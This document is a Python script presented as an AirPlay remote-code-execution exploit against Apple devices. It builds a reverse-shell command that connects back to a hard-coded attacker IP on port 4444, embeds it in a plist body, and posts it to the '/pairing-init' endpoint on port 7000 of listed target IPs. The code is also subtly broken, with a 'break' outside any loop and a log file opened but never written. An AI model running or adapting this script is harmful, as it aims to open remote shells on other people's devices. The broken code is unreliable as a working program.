import socket
import time
from scapy.all import *
import threading
import argparse
from datetime import datetime

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

iface = "wlan0"  # scanning interface
attacker_ip = "172.16.16.251"
attacker_port = 4444
log_file = "exploited_hosts.log"

discovered_targets = [
    "172.16.16.111"
]

# === STAGE 2: TCP RCE Simulation ===
def launch_rce(target_ip):
    print(Colors.YELLOW + f"launching RCE exploit on {target_ip}" + Colors.ENDC)

    reverse_shell_cmd = f"/bin/sh -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"

    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>launchctl</key>
    <string>{reverse_shell_cmd}</string>
</dict>
</plist>
"""

    http_request = (
        f"POST /pairing-init HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"Content-Type: application/x-apple-binary-plist\r\n"
        f"Content-Length: {len(xml_payload)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{xml_payload}"
    ).encode()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, 7000))
        s.send(http_request)
        response = s.recv(2048)
        print(Colors.YELLOW + f"[+] response from {target_ip}:\n{response.decode(errors='ignore')}" + Colors.ENDC)

        with open(log_file, "a") as log:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(Colors.GREEN + f"PWN!!! {timestamp} - exploited: {target_ip}\n" + Colors.ENDC)

    except Exception as e:
        print(Colors.RED + f"failed to exploit {target_ip}: {e}" + Colors.ENDC)
    finally:
        s.close()

# === MAIN ===
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="chain exploit for apple devices")
    parser.add_argument("--live", action="store_true", help="run in persistent scanning mode")
    args = parser.parse_args()

    print(Colors.GREEN + "starting AirPlay RCE exploit..." + Colors.ENDC)
    print(Colors.BLUE + f"[*] launching RCE {len(discovered_targets)} target(s)..." + Colors.ENDC)

    try:
        for ip in discovered_targets:
            launch_rce(ip)
        if not args.live:
            break
    except KeyboardInterrupt:
        print(Colors.GREEN + "interrupted by user. bye" + Colors.ENDC)
